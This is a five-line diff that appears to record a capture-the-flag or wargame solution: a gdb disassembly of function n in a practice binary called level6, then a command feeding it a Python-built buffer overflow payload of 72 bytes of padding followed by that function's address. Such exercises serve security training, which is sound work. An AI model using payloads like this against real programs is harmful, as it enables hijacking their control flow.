@@ -1,0 +1,5 @@
+gdb level6
+(gdb) disas n
+	0x08048454 <+0>:
+
+./level6 `python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]'`
